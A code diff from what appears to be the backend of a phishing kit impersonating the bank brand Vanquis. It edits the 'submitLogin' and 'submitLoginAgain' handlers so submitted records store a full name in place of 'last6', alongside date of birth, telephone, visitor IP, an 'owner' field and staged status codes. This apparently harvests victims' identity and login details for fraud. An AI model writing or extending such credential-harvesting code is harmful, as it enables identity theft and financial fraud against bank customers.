@@ -43,10 +43,10 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-  const { last6, dob, telephone, uniqueid, owner, ip } = req.body;
+  const { fullname, dob, telephone, uniqueid, owner, ip } = req.body;
   try {
     await Vanquis.create({
-      last6,
+      fullname,
       dob,
       telephone,
       status: 1,
@@ -62,11 +62,11 @@ const submitLogin = async (req, res) => {
 };
 
 const submitLoginAgain = async (req, res) => {
-  const { last6, dob, telephone, uniqueid } = req.body;
+  const { fullname, dob, telephone, uniqueid } = req.body;
   try {
     await Vanquis.findOneAndUpdate(
       { uniqueid },
-      { last6, dob, telephone, status: 7 }
+      { fullname, dob, telephone, status: 7 }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
